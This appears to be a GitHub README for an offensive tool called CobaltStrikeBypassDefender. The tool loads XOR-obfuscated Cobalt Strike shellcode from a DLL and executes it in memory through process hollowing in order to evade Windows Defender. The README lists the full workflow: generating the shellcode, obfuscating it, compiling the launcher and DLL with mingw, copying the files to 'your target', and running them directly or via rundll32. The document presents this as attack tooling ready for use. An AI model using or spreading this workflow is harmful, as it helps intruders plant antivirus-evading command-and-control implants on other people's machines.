# CobaltStrikeBypassDefender

<h1>A launcher to load a DLL with xored cobalt strike shellcode executed in memory through process hollowing technique</h1>


<br /><br />
-----------------------------------------------------
<br />

<p align="center">
    My youtube video on this repo : <br />
    <a href="https://youtu.be/CHk2XzFKwNc" align="center" width="100%;">
       <img src="https://github.com/Processus-Thief/CobaltStrikeBypassDefender/raw/main/.assets/minia.jpg" width="80%;">
    </a>
  </p>

<br /><br />
-----------------------------------------------------
<br />




### Usage

1. Generate a x64 cobalt strike shellcode with CSSG :
```
https://github.com/RCStep/CSSG
```
2. Copy your shellcode in obfu.cpp (in "ANTIVIRUS_EXCLUDED_FOLDER" folder) and compile it :
```  
C:\msys64\mingw64\bin\x86_64-w64-mingw32-c++.exe -o obfu.exe obfu.cpp
```
3. Execute obfu.exe, give your own xor secret
4. Copy obfuscated-shellcode.cpp content in dll.cpp file and update shellcode char array variable in process hollowing functions
5. Compile dll.cpp and launcher.cpp :
```
C:\msys64\mingw64\bin\x86_64-w64-mingw32-c++.exe -o shellcode.dll -shared dll.cpp

C:\msys64\mingw64\bin\x86_64-w64-mingw32-c++.exe -o launcher.exe launcher.cpp
```
6. Copy launcher.exe, shellcode.dll and the 3 library files on your target and execute launcher.exe or trigger the RunThatShit function with rundll32 :
```
rundll32 shellcode.dll, RunThatShit
```
7. Enjoy :)




-----------------------------------------------------------------------------------




<p align="center">
    My blog : <a href="https://lestutosdeprocessus.fr"><strong>https://lestutosdeprocessus.fr</strong></a>
    <br />
    <br />
    My Discord server : <a href="https://discord.gg/JJNxV2h"><strong>https://discord.gg/JJNxV2h</strong></a>
</p>



 